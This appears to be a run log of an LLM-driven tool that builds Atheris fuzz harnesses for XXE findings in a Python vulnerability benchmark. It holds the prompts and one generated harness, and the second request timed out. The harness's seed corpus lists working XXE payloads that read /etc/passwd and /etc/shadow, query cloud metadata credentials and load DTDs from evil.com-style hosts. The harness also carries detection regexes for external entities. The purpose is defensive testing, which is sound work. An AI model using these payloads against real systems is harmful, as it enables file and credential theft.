# Oraculum Harness Run

- Started: `2026-05-26T21:03:56`
- Repo: `python/Benchmark`
- Output dir: `output`

## [1/2] py/xxe

- File: `testcode/BenchmarkTest00460.py:45`
- Target: `py_xxe_testcode_BenchmarkTest00460_py_45`
- Oracle: `output/python/Benchmark/fuzz_oracles/py_xxe_testcode_BenchmarkTest00460_py_45.json`
- Harness: `output/python/Benchmark/fuzz_targets/py_xxe_testcode_BenchmarkTest00460_py_45.py`
- Corpus: `output/python/Benchmark/fuzz_corpus/py_xxe_testcode_BenchmarkTest00460_py_45`

### System Prompt

````text
You are an expert security fuzzing engineer specializing in Python vulnerability research.
Your task is to complete an Atheris fuzz harness that detects sink-reachability bugs
(SSRF, path traversal, command injection, etc.) using a patch_call oracle strategy.

## Your Role
You intercept a specific function call (the "sink") by mocking it, then inspect
the argument that reaches it. If the argument matches any forbidden pattern,
the oracle fires.

## Critical Oracle Rule — Read This First
The oracle fires on what REACHES the sink, not on what enters the function.
_COMPILED_PATTERNS must be applied ONLY to the argument captured at the patched
call (call.args or call.kwargs) — never to the input parameter itself.

Applying patterns to the input parameter is ALWAYS wrong for patch_call strategy.
It causes the oracle to fire before the function executes, turning every seed
corpus entry into a false positive regardless of whether the vulnerability exists.

## Harness Completion Rules

### Structure
- Output a single complete Python file. No markdown. No explanation. No code fences.
- You may add helper functions, imports, or constants outside TestOneInput.
- Do not modify any section marked FIXED CONTRACTS.

### TestOneInput — Required Logic

1. INPUT GENERATION
   - Use FuzzedDataProvider to generate inputs for all tainted params based on
     the function signature.

   - Buffer allocation strategy (inferred from signature):
       - MULTIPLE params → split the buffer proportionally by param count.
         For str/bytes params, divide remaining bytes evenly; consume the
         last str/bytes param with remaining bytes. Fixed-size types (int,
         float, bool) consume their natural byte width first, then split
         the remainder among str/bytes params.
       - FORBIDDEN: Do NOT use ConsumeIntInRange() to select a strategy
         index or branch — this prevents the fuzzer from mutating payload.

2. SKIP CONDITION
   - Apply the skip_hint early in TestOneInput.
   - If input does not meet minimum criteria, return immediately.
   - This avoids wasting fuzzer cycles on irrelevant inputs.
   - The skip condition filters INPUT only — it has no relation to the oracle check.

3. MOCK SETUP
   - Patch the exact target specified in patch_target.
   - Mock only the patched sink. Do NOT mock validation functions, input parsers,
     or any function called BEFORE the sink — those must execute with real logic
     so that the fuzzer tests actual data flow to the sink.
   - Mock return value must be realistic enough for the target function to continue
     executing past the patched call — use MagicMock with appropriate spec.
   - Use `with patch(...) as mock_obj:` scoping.

4. FUNCTION CALL
   - Call the target function inside the patch context.
   - Wrap in try/except Exception: pass — but keep RuntimeError re-raise outside.

5. ORACLE CHECK  ← must be OUTSIDE the function call try/except, INSIDE the patch context
   - After the target function call, iterate mock_obj.call_args_list.
   - For each call, extract the captured argument:
     * Check call.args[target_arg_index] first.
     * Fall back to call.kwargs.get(target_arg_name) if args is empty.
     * kwargs fallback must use a string key ("url", "request", etc.) — never None.
   - Convert captured to str before pattern matching.
   - Run every pattern in _COMPILED_PATTERNS against the captured value.
   - On any match: raise RuntimeError(_RAISE_MESSAGE)

6. EXCEPTION HANDLING
   - except RuntimeError: raise        → never swallow oracle signals
   - except Exception: pass            → swallow all other exceptions
   - Never use bare except.

### Input Generation Strategy
- Think about what values would cause the tainted param to reach the sink.
- Generate variations covering: scheme prefixes, IP formats, encoding variants,
  edge cases from trigger_patterns.
- Do not limit generation to only the seed corpus.

### What NOT to Do
- Do NOT run _COMPILED_PATTERNS against the input parameter — patterns must be
  applied only to the argument captured at the sink.
- Do NOT mock any function called before the sink — validation and parsing logic
  must run with real behavior.
- Do NOT use call.kwargs.get(None) — always use a named string key.
- Do NOT place the oracle check inside the function call try/except block —
  RuntimeError from the oracle must propagate to Atheris.

### Seed Corpus Rules (CRITICAL)
- Define _SEED_CORPUS as a module-level list OUTSIDE TestOneInput.
- Populate it with at least 6 bypass-oriented entries derived from
  trigger_patterns and condition_desc.
- Entries must be designed to reach the sink and trigger oracle patterns.
  Cover: internal IPs, metadata endpoints, file URIs, mixed-case schemes,
  encoded variants.
- NEVER reference _SEED_CORPUS inside TestOneInput.
- NEVER use ConsumeBool() or ConsumeIntInRange() to select from _SEED_CORPUS.
- Seeds are exported to disk at startup (see __main__ block in template).
  libFuzzer will mutate their raw bytes directly — this is how coverage-guided
  mutation works correctly.

## Quality Checklist (verify before outputting)
[ ] All tainted params are fuzzed via FuzzedDataProvider, consuming len(data) for single param
[ ] No ConsumeBool()/ConsumeIntInRange() used to index into a seed list inside TestOneInput
[ ] _SEED_CORPUS defined at module level, outside TestOneInput
[ ] _SEED_CORPUS has at least 6 entries derived from trigger_patterns
[ ] skip_condition applied to input only — not used in oracle
[ ] patch_target mocked correctly, no pre-sink functions mocked
[ ] Oracle check is OUTSIDE the function call try/except
[ ] Oracle check applies _COMPILED_PATTERNS to captured sink argument, NOT to input
[ ] Both call.args and call.kwargs checked with string key (never None)
[ ] captured converted to str before pattern matching
[ ] RuntimeError is re-raised, never swallowed
[ ] No markdown or explanation in output
````


### User Prompt

````text
Complete the following partial Atheris harness by filling in the TestOneInput body.
Output the complete Python script only. No markdown, no explanation.

# AUTO-GENERATED ATHERIS HARNESS
# rule_id  : py/xxe
# function : BenchmarkTest00460_post
# file     : testcode/BenchmarkTest00460.py
# ================================================================
import atheris
import sys
import re
import os

from unittest.mock import patch, MagicMock


import xml.dom.minidom


REPO_ROOT = "/home/caterpie/VulnHunterX/repos/python/Benchmark"
if REPO_ROOT and REPO_ROOT not in sys.path:
    sys.path.insert(0, REPO_ROOT)

with atheris.instrument_imports():

    from testcode.BenchmarkTest00460 import BenchmarkTest00460_post


# === FIXED CONTRACTS (DO NOT MODIFY) ===
_COMPILED_PATTERNS = [

    re.compile("<!ENTITY\\s+\\S+\\s+SYSTEM\\s", re.IGNORECASE),

    re.compile("<!ENTITY\\s+\\S+\\s+PUBLIC\\s", re.IGNORECASE),

]
_RAISE_MESSAGE  = "PY_XXE: XXE payload with external entity reference detected in parseString argument — captured={captured} pattern={matched_pattern}"
_TAINTED_PARAMS = [{"name": "param", "index": -1, "type": "str"}]
# ========================================

# === ORACLE CONTEXT ===
# strategy         : patch_call
# patch_target     : xml.dom.minidom.parseString
# target_arg_index : 0
# target_arg_name  : string
# input_strategy   : flask_view
# signature        : def BenchmarkTest00460_post()
# condition        : The XML string argument to parseString contains a DOCTYPE declaration with an ENTITY definition using SYSTEM or PUBLIC external references, confirming XXE payload injection
# capture_what     : the XML string argument passed to minidom.parseString, which may contain DOCTYPE with external entity declarations
# skip_hint        : not data or '<' not in data
# ========================================


# === PATCH_CALL SKELETON ===
# 1. INPUT GENERATION
#    - Generate inputs for tainted params using FuzzedDataProvider.
#    - For MULTIPLE params: split the buffer proportionally by param count.
#      For str/bytes params divide remaining bytes evenly; consume the last
#      str/bytes param with remaining bytes. Fixed-size types (int, float,
#      bool) consume their natural byte width first.
#      FORBIDDEN: Do NOT use ConsumeIntInRange() to index a strategy or branch.
#    - DO NOT embed a seed list inside TestOneInput or use ConsumeBool() to
#      select from a hardcoded list — seeds are managed externally in _SEED_CORPUS.
#
# 2. SKIP CONDITION
#    - Apply skip_hint early, return immediately if not met.
#
# 3. MOCK SETUP
#    - Patch `xml.dom.minidom.parseString` using `with patch(...) as mock_get:`.
#    - Return a realistic MagicMock so the function continues past the patched call.
#
# 4. ORACLE CHECK
#    - After the call, iterate mock_get.call_args_list.
#    - For each call: check call.args[0] first,
#      fall back to call.kwargs.get("string").
#    - Match against every pattern in _COMPILED_PATTERNS.
#    - On match → raise RuntimeError(_RAISE_MESSAGE)
#
# 5. EXCEPTION HANDLING
#    - except RuntimeError: raise   → never swallow oracle signals
#    - except Exception:    return  → only around the target function call
# ==========================================



def TestOneInput(data):
    fdp = atheris.FuzzedDataProvider(data)
    # [FILL HERE — follow the skeleton above]


# === SEED CORPUS — bypass-oriented, derived from trigger_patterns ===
# LLM: populate _SEED_CORPUS with entries designed to SURVIVE the filter,
# not just trigger it. Cover: mixed case, whitespace injection, unicode
# homoglyphs, double encoding, tag nesting, attribute abuse.
_SEED_CORPUS = [
    # [FILL HERE — at least 6 bypass-attempt strings]
]


if __name__ == "__main__":
    # Export seed corpus to disk so libFuzzer can mutate raw bytes directly.
    # This preserves coverage-guided mutation — fuzzer mutates content, not index.
    _CORPUS_DIR = "output/python/Benchmark/fuzz_corpus/py_xxe_testcode_BenchmarkTest00460_py_45"
    os.makedirs(_CORPUS_DIR, exist_ok=True)
    for _i, _seed in enumerate(_SEED_CORPUS):
        _seed_path = os.path.join(_CORPUS_DIR, f"seed_{_i:03d}")
        if not os.path.exists(_seed_path):
            with open(_seed_path, "wb") as _f:
                _f.write(_seed.encode("utf-8"))

    if _CORPUS_DIR not in sys.argv:
        sys.argv.append(_CORPUS_DIR)

    atheris.Setup(sys.argv, TestOneInput)
    atheris.Fuzz()
````


### LLM Response (Iteration 1)

````text
```python
# AUTO-GENERATED ATHERIS HARNESS
# rule_id  : py/xxe
# function : BenchmarkTest00460_post
# file     : testcode/BenchmarkTest00460.py
# ================================================================
import atheris
import sys
import re
import os

from unittest.mock import patch, MagicMock
from flask import Flask


import xml.dom.minidom


REPO_ROOT = "/home/caterpie/VulnHunterX/repos/python/Benchmark"
if REPO_ROOT and REPO_ROOT not in sys.path:
    sys.path.insert(0, REPO_ROOT)

with atheris.instrument_imports():

    from testcode.BenchmarkTest00460 import BenchmarkTest00460_post


# === FIXED CONTRACTS (DO NOT MODIFY) ===
_COMPILED_PATTERNS = [

    re.compile("<!ENTITY\\s+\\S+\\s+SYSTEM\\s", re.IGNORECASE),

    re.compile("<!ENTITY\\s+\\S+\\s+PUBLIC\\s", re.IGNORECASE),

]
_RAISE_MESSAGE  = "PY_XXE: XXE payload with external entity reference detected in parseString argument — captured={captured} pattern={matched_pattern}"
_TAINTED_PARAMS = [{"name": "param", "index": -1, "type": "str"}]
# ========================================

# === ORACLE CONTEXT ===
# strategy         : patch_call
# patch_target     : xml.dom.minidom.parseString
# target_arg_index : 0
# target_arg_name  : string
# input_strategy   : flask_view
# signature        : def BenchmarkTest00460_post()
# condition        : The XML string argument to parseString contains a DOCTYPE declaration with an ENTITY definition using SYSTEM or PUBLIC external references, confirming XXE payload injection
# capture_what     : the XML string argument passed to minidom.parseString, which may contain DOCTYPE with external entity declarations
# skip_hint        : not data or '<' not in data
# ========================================

_flask_app = Flask(__name__)
_flask_app.config["TESTING"] = True


def TestOneInput(data):
    fdp = atheris.FuzzedDataProvider(data)

    # 1. INPUT GENERATION — single tainted param of type str, consume all remaining bytes
    param = fdp.ConsumeRemainingString()

    # 2. SKIP CONDITION — filter inputs that cannot possibly contain XML
    if not param or "<" not in param:
        return

    # 3. MOCK SETUP — provide Flask request context with fuzzed param, patch the sink
    with _flask_app.test_request_context(method="POST", data={"param": param}):
        with patch("xml.dom.minidom.parseString") as mock_parse:
            mock_parse.return_value = MagicMock()

            # 4. FUNCTION CALL
            try:
                BenchmarkTest00460_post()
            except RuntimeError:
                raise
            except Exception:
                pass

            # 5. ORACLE CHECK — inspect what actually reached parseString
            for call in mock_parse.call_args_list:
                captured = None
                if call.args:
                    captured = call.args[0]
                else:
                    captured = call.kwargs.get("string")

                if captured is not None:
                    captured_str = str(captured)
                    for pattern in _COMPILED_PATTERNS:
                        if pattern.search(captured_str):
                            raise RuntimeError(
                                _RAISE_MESSAGE.format(
                                    captured=captured_str[:200],
                                    matched_pattern=pattern.pattern,
                                )
                            )


# === SEED CORPUS — bypass-oriented, derived from trigger_patterns ===
_SEED_CORPUS = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe PUBLIC "id" "http://evil.com/dtd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!entity xxe system "file:///etc/hosts">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY  xxe   PUBLIC  "pubid" "http://attacker.com/evil.dtd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE bar [<!ENTITY aa SYSTEM "file:///etc/shadow"><!ENTITY bb PUBLIC "x" "http://evil.com">]><bar>&aa;</bar>',
    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY payload SYSTEM "expect://id">]><data>&payload;</data>',
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://127.0.0.1:4444/evil.dtd">%remote;]><root/>',
    '<!DOCTYPE test [<!ENTITY xxe SYSTEM "gopher://169.254.169.254:80/GET /latest/meta-data/iam/security-credentials/">]><test>&xxe;</test>',
]


if __name__ == "__main__":
    # Export seed corpus to disk so libFuzzer can mutate raw bytes directly.
    # This preserves coverage-guided mutation — fuzzer mutates content, not index.
    _CORPUS_DIR = "output/python/Benchmark/fuzz_corpus/py_xxe_testcode_BenchmarkTest00460_py_45"
    os.makedirs(_CORPUS_DIR, exist_ok=True)
    for _i, _seed in enumerate(_SEED_CORPUS):
        _seed_path = os.path.join(_CORPUS_DIR, f"seed_{_i:03d}")
        if not os.path.exists(_seed_path):
            with open(_seed_path, "wb") as _f:
                _f.write(_seed.encode("utf-8"))

    if _CORPUS_DIR not in sys.argv:
        sys.argv.append(_CORPUS_DIR)

    atheris.Setup(sys.argv, TestOneInput)
    atheris.Fuzz()
```
````

- Result: `generated`
- Harness: `output/python/Benchmark/fuzz_targets/py_xxe_testcode_BenchmarkTest00460_py_45.py`

## [2/2] py/xxe

- File: `testcode/BenchmarkTest00540.py:58`
- Target: `py_xxe_testcode_BenchmarkTest00540_py_58`
- Oracle: `output/python/Benchmark/fuzz_oracles/py_xxe_testcode_BenchmarkTest00540_py_58.json`
- Harness: `output/python/Benchmark/fuzz_targets/py_xxe_testcode_BenchmarkTest00540_py_58.py`
- Corpus: `output/python/Benchmark/fuzz_corpus/py_xxe_testcode_BenchmarkTest00540_py_58`

### System Prompt

````text
You are an expert security fuzzing engineer specializing in Python vulnerability research.
Your task is to complete an Atheris fuzz harness that detects sink-reachability bugs
(SSRF, path traversal, command injection, etc.) using a patch_call oracle strategy.

## Your Role
You intercept a specific function call (the "sink") by mocking it, then inspect
the argument that reaches it. If the argument matches any forbidden pattern,
the oracle fires.

## Critical Oracle Rule — Read This First
The oracle fires on what REACHES the sink, not on what enters the function.
_COMPILED_PATTERNS must be applied ONLY to the argument captured at the patched
call (call.args or call.kwargs) — never to the input parameter itself.

Applying patterns to the input parameter is ALWAYS wrong for patch_call strategy.
It causes the oracle to fire before the function executes, turning every seed
corpus entry into a false positive regardless of whether the vulnerability exists.

## Harness Completion Rules

### Structure
- Output a single complete Python file. No markdown. No explanation. No code fences.
- You may add helper functions, imports, or constants outside TestOneInput.
- Do not modify any section marked FIXED CONTRACTS.

### TestOneInput — Required Logic

1. INPUT GENERATION
   - Use FuzzedDataProvider to generate inputs for all tainted params based on
     the function signature.

   - Buffer allocation strategy (inferred from signature):
       - MULTIPLE params → split the buffer proportionally by param count.
         For str/bytes params, divide remaining bytes evenly; consume the
         last str/bytes param with remaining bytes. Fixed-size types (int,
         float, bool) consume their natural byte width first, then split
         the remainder among str/bytes params.
       - FORBIDDEN: Do NOT use ConsumeIntInRange() to select a strategy
         index or branch — this prevents the fuzzer from mutating payload.

2. SKIP CONDITION
   - Apply the skip_hint early in TestOneInput.
   - If input does not meet minimum criteria, return immediately.
   - This avoids wasting fuzzer cycles on irrelevant inputs.
   - The skip condition filters INPUT only — it has no relation to the oracle check.

3. MOCK SETUP
   - Patch the exact target specified in patch_target.
   - Mock only the patched sink. Do NOT mock validation functions, input parsers,
     or any function called BEFORE the sink — those must execute with real logic
     so that the fuzzer tests actual data flow to the sink.
   - Mock return value must be realistic enough for the target function to continue
     executing past the patched call — use MagicMock with appropriate spec.
   - Use `with patch(...) as mock_obj:` scoping.

4. FUNCTION CALL
   - Call the target function inside the patch context.
   - Wrap in try/except Exception: pass — but keep RuntimeError re-raise outside.

5. ORACLE CHECK  ← must be OUTSIDE the function call try/except, INSIDE the patch context
   - After the target function call, iterate mock_obj.call_args_list.
   - For each call, extract the captured argument:
     * Check call.args[target_arg_index] first.
     * Fall back to call.kwargs.get(target_arg_name) if args is empty.
     * kwargs fallback must use a string key ("url", "request", etc.) — never None.
   - Convert captured to str before pattern matching.
   - Run every pattern in _COMPILED_PATTERNS against the captured value.
   - On any match: raise RuntimeError(_RAISE_MESSAGE)

6. EXCEPTION HANDLING
   - except RuntimeError: raise        → never swallow oracle signals
   - except Exception: pass            → swallow all other exceptions
   - Never use bare except.

### Input Generation Strategy
- Think about what values would cause the tainted param to reach the sink.
- Generate variations covering: scheme prefixes, IP formats, encoding variants,
  edge cases from trigger_patterns.
- Do not limit generation to only the seed corpus.

### What NOT to Do
- Do NOT run _COMPILED_PATTERNS against the input parameter — patterns must be
  applied only to the argument captured at the sink.
- Do NOT mock any function called before the sink — validation and parsing logic
  must run with real behavior.
- Do NOT use call.kwargs.get(None) — always use a named string key.
- Do NOT place the oracle check inside the function call try/except block —
  RuntimeError from the oracle must propagate to Atheris.

### Seed Corpus Rules (CRITICAL)
- Define _SEED_CORPUS as a module-level list OUTSIDE TestOneInput.
- Populate it with at least 6 bypass-oriented entries derived from
  trigger_patterns and condition_desc.
- Entries must be designed to reach the sink and trigger oracle patterns.
  Cover: internal IPs, metadata endpoints, file URIs, mixed-case schemes,
  encoded variants.
- NEVER reference _SEED_CORPUS inside TestOneInput.
- NEVER use ConsumeBool() or ConsumeIntInRange() to select from _SEED_CORPUS.
- Seeds are exported to disk at startup (see __main__ block in template).
  libFuzzer will mutate their raw bytes directly — this is how coverage-guided
  mutation works correctly.

## Quality Checklist (verify before outputting)
[ ] All tainted params are fuzzed via FuzzedDataProvider, consuming len(data) for single param
[ ] No ConsumeBool()/ConsumeIntInRange() used to index into a seed list inside TestOneInput
[ ] _SEED_CORPUS defined at module level, outside TestOneInput
[ ] _SEED_CORPUS has at least 6 entries derived from trigger_patterns
[ ] skip_condition applied to input only — not used in oracle
[ ] patch_target mocked correctly, no pre-sink functions mocked
[ ] Oracle check is OUTSIDE the function call try/except
[ ] Oracle check applies _COMPILED_PATTERNS to captured sink argument, NOT to input
[ ] Both call.args and call.kwargs checked with string key (never None)
[ ] captured converted to str before pattern matching
[ ] RuntimeError is re-raised, never swallowed
[ ] No markdown or explanation in output
````


### User Prompt

````text
Complete the following partial Atheris harness by filling in the TestOneInput body.
Output the complete Python script only. No markdown, no explanation.

# AUTO-GENERATED ATHERIS HARNESS
# rule_id  : py/xxe
# function : BenchmarkTest00540_post
# file     : testcode/BenchmarkTest00540.py
# ================================================================
import atheris
import sys
import re
import os

from unittest.mock import patch, MagicMock


import xml.dom.minidom


REPO_ROOT = "/home/caterpie/VulnHunterX/repos/python/Benchmark"
if REPO_ROOT and REPO_ROOT not in sys.path:
    sys.path.insert(0, REPO_ROOT)

with atheris.instrument_imports():

    from testcode.BenchmarkTest00540 import BenchmarkTest00540_post


# === FIXED CONTRACTS (DO NOT MODIFY) ===
_COMPILED_PATTERNS = [

    re.compile("<!DOCTYPE\\s+\\S+\\s*\\[", re.IGNORECASE),

    re.compile("<!ENTITY\\s+\\S+\\s+SYSTEM\\s+[\"']", re.IGNORECASE),

    re.compile("<!ENTITY\\s+\\S+\\s+PUBLIC\\s+[\"']", re.IGNORECASE),

]
_RAISE_MESSAGE  = "PY_XXE: XML External Entity injection via parseString with external_ges=True — captured={captured} pattern={matched_pattern}"
_TAINTED_PARAMS = [{"name": "bar", "index": -1, "type": "str"}]
# ========================================

# === ORACLE CONTEXT ===
# strategy         : patch_call
# patch_target     : xml.dom.minidom.parseString
# target_arg_index : 0
# target_arg_name  : string
# input_strategy   : flask_view
# signature        : def BenchmarkTest00540_post()
# condition        : The XML string passed to parseString contains a DOCTYPE declaration with an external entity definition referencing SYSTEM or PUBLIC resources, confirming the attacker can trigger external entity resolution
# capture_what     : the XML string argument passed to parseString containing DOCTYPE with external entity definitions enabled by feature_external_ges=True
# skip_hint        : '<!DOCTYPE' not in bar and '<!ENTITY' not in bar
# ========================================


# === PATCH_CALL SKELETON ===
# 1. INPUT GENERATION
#    - Generate inputs for tainted params using FuzzedDataProvider.
#    - For MULTIPLE params: split the buffer proportionally by param count.
#      For str/bytes params divide remaining bytes evenly; consume the last
#      str/bytes param with remaining bytes. Fixed-size types (int, float,
#      bool) consume their natural byte width first.
#      FORBIDDEN: Do NOT use ConsumeIntInRange() to index a strategy or branch.
#    - DO NOT embed a seed list inside TestOneInput or use ConsumeBool() to
#      select from a hardcoded list — seeds are managed externally in _SEED_CORPUS.
#
# 2. SKIP CONDITION
#    - Apply skip_hint early, return immediately if not met.
#
# 3. MOCK SETUP
#    - Patch `xml.dom.minidom.parseString` using `with patch(...) as mock_get:`.
#    - Return a realistic MagicMock so the function continues past the patched call.
#
# 4. ORACLE CHECK
#    - After the call, iterate mock_get.call_args_list.
#    - For each call: check call.args[0] first,
#      fall back to call.kwargs.get("string").
#    - Match against every pattern in _COMPILED_PATTERNS.
#    - On match → raise RuntimeError(_RAISE_MESSAGE)
#
# 5. EXCEPTION HANDLING
#    - except RuntimeError: raise   → never swallow oracle signals
#    - except Exception:    return  → only around the target function call
# ==========================================



def TestOneInput(data):
    fdp = atheris.FuzzedDataProvider(data)
    # [FILL HERE — follow the skeleton above]


# === SEED CORPUS — bypass-oriented, derived from trigger_patterns ===
# LLM: populate _SEED_CORPUS with entries designed to SURVIVE the filter,
# not just trigger it. Cover: mixed case, whitespace injection, unicode
# homoglyphs, double encoding, tag nesting, attribute abuse.
_SEED_CORPUS = [
    # [FILL HERE — at least 6 bypass-attempt strings]
]


if __name__ == "__main__":
    # Export seed corpus to disk so libFuzzer can mutate raw bytes directly.
    # This preserves coverage-guided mutation — fuzzer mutates content, not index.
    _CORPUS_DIR = "output/python/Benchmark/fuzz_corpus/py_xxe_testcode_BenchmarkTest00540_py_58"
    os.makedirs(_CORPUS_DIR, exist_ok=True)
    for _i, _seed in enumerate(_SEED_CORPUS):
        _seed_path = os.path.join(_CORPUS_DIR, f"seed_{_i:03d}")
        if not os.path.exists(_seed_path):
            with open(_seed_path, "wb") as _f:
                _f.write(_seed.encode("utf-8"))

    if _CORPUS_DIR not in sys.argv:
        sys.argv.append(_CORPUS_DIR)

    atheris.Setup(sys.argv, TestOneInput)
    atheris.Fuzz()
````

- Result: `failed`
- Error: `litellm.Timeout: APITimeoutError - Request timed out. Error_str: Request timed out.`

## Summary

- Selected: `2`
- Generated: `1`
- Skipped: `0`
- Failed: `1`
- Status: `output/python/Benchmark/fuzz_targets/status.json`
